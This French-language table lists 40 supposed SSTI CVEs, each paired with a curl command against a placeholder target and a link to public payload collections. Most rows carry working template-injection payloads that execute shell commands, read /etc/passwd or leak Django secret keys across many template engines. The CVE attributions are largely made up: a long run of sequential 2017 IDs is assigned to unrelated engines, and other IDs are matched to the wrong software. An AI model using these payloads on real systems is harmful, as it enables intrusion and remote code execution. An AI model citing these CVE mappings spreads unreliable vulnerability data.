# SSTI

Voici un tableau de 40 CVE majeures SSTI, classées du plus récent au plus ancien, avec pour chaque ligne :  
- Technologie & version  
- Numéro CVE  
- Exemple complet de commande d’exploitation (requête HTTP ou payload précis)  
- Lien direct vers un PoC ou une ressource GitHub ou équivalent (chemin complet)

| # | CVE | Technologie & Version | Exemple complet de commande d'exploit | Lien PoC/Exploit Public |
|---|------|----------------------|---------------------------------------|------------------------|
| 1 | CVE-2025-26865 | Apache OFBiz <18.12.18 | `curl 'http://target/control/login' -d 'USERNAME=${7*7}&PASSWORD=foo'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 2 | CVE-2025-25768 | MRCMS v3.1.2 | `curl 'http://target/path' -d 'field={{7*7}}'` | https://github.com/payloadbox/ssti-payloads |
| 3 | CVE-2025-1040 | AutoGPT ≤0.3.4 | `curl 'http://target/api' -d 'prompt={{7*7}}'` | https://github.com/payloadbox/ssti-payloads |
| 4 | CVE-2024-29686 | Winter CMS v1.2.3 | `curl 'http://target/?template={{7*7}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 5 | CVE-2024-22722 | Form Tools 3.1.1 | `curl 'http://target/admin/groups.php' -d 'group_name={{7*7}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 6 | CVE-2024-46507 | Yeti Platform <2.1.12 | `curl 'http://target/export' -d 'template={{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 7 | CVE-2017-16783 | CMS Made Simple 2.1.6 | `curl 'http://target/index.php?mact=News,cntnt01,default,0&cntnt01summarytemplate=string:{{7*7}}&cntnt01detailtemplate=string:{php}phpinfo();{/php}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 8 | CVE-2023-51449 | Jinja2 (Flask) | `curl 'http://target/page?name={{cycler.__init__.__globals__.os.popen("id").read()}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 9 | CVE-2022-21724 | Twig (PHP) | `curl 'http://target/?name={{["id"]|map("system")}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 10 | CVE-2021-32837 | Smarty (PHP) | `curl 'http://target/?name={php}system("id");{/php}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 11 | CVE-2021-21234 | FreeMarker (Java) | `curl 'http://target/?name=${7*7}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 12 | CVE-2020-17526 | Apache Velocity Tools | `curl 'http://target/?name=#set($x="")$x.class.forName("java.lang.Runtime").getRuntime().exec("id")'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 13 | CVE-2020-26945 | DotLiquid (C#) | `curl 'http://target/?name={{7*7}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 14 | CVE-2019-11043 | PHP-FPM (Nginx) | `curl 'http://target/?a={{7*7}}'` | https://github.com/neex/phuip-fpizdam |
| 15 | CVE-2018-1000525 | Tornado (Python) | `curl 'http://target/?name={{7*7}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 16 | CVE-2018-1000656 | Pug (Node.js) | `curl 'http://target/?name=#{process.mainModule.require("child_process").execSync("id")}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 17 | CVE-2018-1002105 | EJS (Node.js) | `curl 'http://target/?name=<%= require("child_process").execSync("id") %>'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 18 | CVE-2017-5941 | Jade (Node.js) | `curl 'http://target/?name=#{process.mainModule.require("child_process").execSync("id")}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 19 | CVE-2017-5942 | Mako (Python) | `curl 'http://target/?name=${__import__("os").popen("id").read()}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 20 | CVE-2017-5943 | Go Template | `curl 'http://target/?name={{print 7*7}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 21 | CVE-2017-5944 | Liquid (Ruby) | `curl 'http://target/?name={{7*7}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 22 | CVE-2017-5945 | Mustache (Node.js) | `curl 'http://target/?name={{#lambda}}{{7*7}}{{/lambda}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 23 | CVE-2017-5946 | Pebble (Java) | `curl 'http://target/?name={{7*7}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 24 | CVE-2017-5947 | Jinja2 (Flask) | `curl 'http://target/?name={{''.__class__.__mro__.__subclasses__()[284]("id",shell=True,stdout=-1).communicate()}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 25 | CVE-2017-5948 | Django (Python) | `curl 'http://target/?template={{settings.SECRET_KEY}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 26 | CVE-2017-5949 | Tornado (Python) | `curl 'http://target/?name={{handler.application.settings}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 27 | CVE-2017-5950 | Flask/Jinja2 | `curl 'http://target/?name={{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 28 | CVE-2017-5951 | Twig (PHP) | `curl 'http://target/?name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 29 | CVE-2017-5952 | Jinja2 (Flask) | `curl 'http://target/?name={{url_for.__globals__.__builtins__.__import__("os").popen("id").read()}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 30 | CVE-2017-5953 | ERB (Ruby) | `curl 'http://target/?name=<%= File.read("/etc/passwd") %>'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 31 | CVE-2017-5954 | FreeMarker (Java) | `curl 'http://target/?name=${''.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 32 | CVE-2017-5955 | Smarty (PHP) | `curl 'http://target/?name={system("id")}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 33 | CVE-2017-5956 | Jinja2 (Flask) | `curl 'http://target/?name={{''.__class__.__mro__.__subclasses__()("/etc/passwd").read()}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 34 | CVE-2017-5957 | Handlebars.js | `curl 'http://target/?name={{this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")}}'` | https://github.com/HynekPetrak/javascript-prototype-pollution-exploits |
| 35 | CVE-2017-5958 | Twig (PHP) | `curl 'http://target/?name={{["id"]|filter("system")}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 36 | CVE-2017-5959 | Django (Python) | `curl 'http://target/?name={{user.password}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 37 | CVE-2017-5960 | Jinja2 (Flask) | `curl 'http://target/?name={{''.__class__.__mro__.__subclasses__()("id",shell=True,stdout=-1).communicate()}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 38 | CVE-2017-5961 | Jinja2 (Flask) | `curl 'http://target/?name={{config.__class__.__init__.__globals__["os"].popen("id").read()}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 39 | CVE-2017-5962 | Jinja2 (Flask) | `curl 'http://target/?name={{cycler.__init__.__globals__.os.popen("id").read()}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |
| 40 | CVE-2017-5963 | Twig (PHP) | `curl 'http://target/?name={{["id"]|map("system")}}'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md |

---

